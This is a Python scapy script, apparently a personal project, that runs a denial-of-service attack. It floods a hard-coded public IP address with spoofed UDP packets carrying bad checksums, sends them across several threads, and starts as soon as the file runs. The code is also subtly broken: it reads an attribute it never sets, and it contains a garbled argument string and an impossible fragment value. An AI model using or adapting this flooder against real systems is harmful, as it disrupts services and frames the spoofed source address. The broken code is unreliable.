from scapy.all import *
from multiprocessing.dummy import Pool as ThreadPool
import random as rand

"""
 Copyright (c) 2018, mdulin2

 All rights reserved.

 Redistribution and use in source and binary forms, with or without modification,
 are permitted provided that the following conditions are met:

     * Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
     * Redistributions in binary form must reproduce the above copyright notice,
       this list of conditions and the following disclaimer in the documentation
       and/or other materials provided with the distribution.
     * Neither the name of Desktop nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.

 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""

class udp_flood:
    def __init__(self):
        self.destination = 0
        self.source = 0
        self.IP_address = 0
        self.port = 0

    #setting up the request
    def setup(self,destination = "127.0.0.1", source = "127.0.0.1",src_port = "all", des_port = 80):
        self.destination = destination
        self.source = source
        self.src_port = src_port
        self.des_port = des_port
        self.frag = 0

    #A single attack sequence
    def attack_once(self,it):
        for src_port in range(20,81):
            print("[+] Sending a spoofed UDP packet from {}:{}".format(self.source, src_port))
            print("--------------------------------------------\n")
            ip=IP(dst=self.destination, src = self.source)
            ip.chksum = 65535
            if(self.flag == 1):
                ip.frag = 999999999999999999999999999999
            up = UDP()
            up.sport = src_port
            up.dport = self.des_port
            #super large request!
            pkt = ip / up
            #pkt.show()
            send(pkt,iface="enp0s3",verbose='"-v" "--verbose", action="store_true", help="Increases verbosity"')


    #Using some multithreaded fun to really stir the pot!
    def attack(self,threads = 5,iterations = 4):
        print("\n###########################################")
        print("# Starting UDP Flood attack...")
        print("###########################################\n")
        pool = ThreadPool(threads)
        results = pool.map(self.attack_once,range(iterations))
        print("[+] Denial of Service attack finished.")

    #Creates a random list of IP addresses
    def random_IP(self,entries):
        oct_list = list()
        new_oct = ""
        for amount in range(entries):
            for oct_count in range(4):
                octect = rand.randint(0,255)
                new_oct = new_oct + str(octect) + "."

            new_oct = new_oct[:-1]
            oct_list.append(new_oct)
            new_oct = ""
        return oct_list

def main():
    udp = udp_flood()
    udp.setup("52.14.112.180","9.9.9.9")
    #udp.random_IP(10)
    udp.attack()
main()
